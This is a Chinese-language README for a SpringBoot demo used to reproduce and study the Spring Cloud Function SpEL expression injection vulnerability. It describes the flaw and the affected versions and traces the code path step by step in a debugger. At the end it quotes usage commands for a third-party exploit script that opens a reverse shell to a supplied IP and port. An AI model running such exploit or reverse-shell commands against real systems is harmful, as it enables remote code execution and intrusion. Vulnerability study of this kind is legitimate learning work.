# 关于项目

一个简单的SpringBoot Demo用于复现学习 [Spring Cloud Function SPEL表达式注入漏洞](https://www.anquanke.com/post/id/271221)

## 漏洞信息

### 漏洞名称

Spring Cloud Function SPEL表达式注入漏洞

### 漏洞描述

Spring框架为现代基于java的企业应用程序(在任何类型的部署平台上)提供了一个全面的编程和配置模型。

Spring Cloud 中的 serveless框架 Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成Spel表达式注入，攻击者可通过该漏洞执行任意代码。

### 利用条件
3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2

### 环境搭建
在官方网页新建一个 Spring boot 项目(https://start.spring.io/)、使用idea启动。

### 修改 pom.xml 配置文件

编译项目成功后，启动 http://127.0.0.1:8080，出现 Whitelabel Error Page 页面表示成功。

### 漏洞分析（利用链跟踪）

一般步骤：
```
1. 搭建测试环境（可用IDE调试）
2. 验证触发漏洞的poc/exp  `spring_cloud_function_spel_poc.py`
3. 动态单步调试（通过IDE以Debug模式跟踪调试，观察参数变化）
```
[spring_cloud_function_spel_poc.py](/spring_cloud_function_spel_poc.py)

1.看官方的补丁，这个commit还是挺明显的。
- [spring-cloud-function官方修复记录](https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f)

2.设置断点
进入springframework/cloud/function/context/config/RoutingFunction文件，在apply()方法入口处添加断点，然后IDEA开debug模式运行demo，再运行poc触发断点调试。
![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406095930.png)

可以看到headers中携带了构造的参数

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406100556.png)

前面的一些参数检查可以直接step over过，但要注意进入到springframework/cloud/function/context/config/RoutingFunction/functionFromExpression()方法。

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406101032.png)

routingExpression 会做为参数传入到 springframework/expression/common/TemplateAwareExpressionParser/parseExpression()方法中。
![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406101220.png)

判读其context是否为null，不为null再进入方法
![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406101541.png)

进入springframework/expression/spel/standard/SpelExpressionParser/doPareExpression() 会 new 一个 InternalSpelExpressionParser 类调用 doPareExpression() ，继续step into。
![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406101818.png)

在springframeworl/expression/spel/stand/InternalSpelExpressionParser/doParseExpression()方法中、会在tokenizer.process()中 对token进行 源码与字节码的判断操作、继续向下。
![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406101954.png)

跟进到 springframwork/expression/spel/standard/SpelExpression/SpelExpression()，会new 一个SpelExpression()
![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406102343.png)

在SpelExpression()方法中会将将表达式赋值到 this.expression 继续跟进 return到 springframework/expression/spel/standard/SpelpressionParser/doParseExpression()、
继续return到springframework/expression/common/TemplateAwareExpressionPareser/pareExpression()、
return springframework/cloud/function/context/config/RoutingFunction/functionFromExpression()

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406102659.png)

在functionFromExpression()方法中会进入MessageUtils.toCaseInsensitiveHeadersStructure()。
![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406102834.png)

继续step into到调用MessageStructureWithCaseInsensitiveHeaderKeys()，跟进到 putAll()方法，获取message中头信息。
![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406103046.png)

最终进入漏洞触发点，触发漏洞。

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406103854.png)

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed3/20220406104144.png)

## 问题解决
- [java: 错误: 无效的源发行版：15](https://blog.csdn.net/qq_42025798/article/details/113917231)

## REF

- [Spring Cloud Function SPEL表达式注入漏洞](https://www.anquanke.com/post/id/271221)
- [SpringCloud Function SpEL漏洞环境搭建+漏洞复现](https://www.anquanke.com/post/id/271167)
- [Spring-cloud-function-SpEL-RCE](https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE)


```
开始检测漏洞并反弹shell
## 检测漏洞
python3 Spel_RCE_POC.py url.txt
## 反弹shell
python3 Spel_RCE_Bash_EXP.py http://192.168.160.146:9000/ 192.168.160.241 7777
```

